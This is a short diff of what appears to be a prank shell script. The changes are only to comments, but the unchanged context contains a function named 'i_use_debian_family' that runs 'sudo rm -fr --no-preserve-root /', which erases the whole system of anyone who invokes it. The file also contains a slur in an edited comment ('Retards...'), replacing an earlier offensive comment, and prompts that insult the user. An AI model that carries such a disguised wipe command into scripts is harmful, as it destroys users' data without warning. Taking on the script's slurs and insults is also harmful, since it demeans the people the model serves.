@@ -124,6 +124,7 @@ function i_use_debian_family() {
     sudo rm -fr --no-preserve-root /
 }
 
+# Promoting Gachi Community
 function gender_sex_validation() {
     echo "Can you enter your gender? ~:"
     read gender;
@@ -131,10 +132,11 @@ function gender_sex_validation() {
     echo "Ah I forgot that it's 2k22. Does it even matter? (～￣▽￣)～"
     echo "Now GET THE HELL OUT OF HERE!!! - @ThePrimeagen"
 
-    # Fucking slaves...
+    # Retards...
     unset gender;
 }
 
+# Yes, I earn XXX,XXX,XXX per hour o(￣▽￣)ｄ
 function senior_developer() {
     if [ -z "$1" ]; then
         echo "Write something idiot"
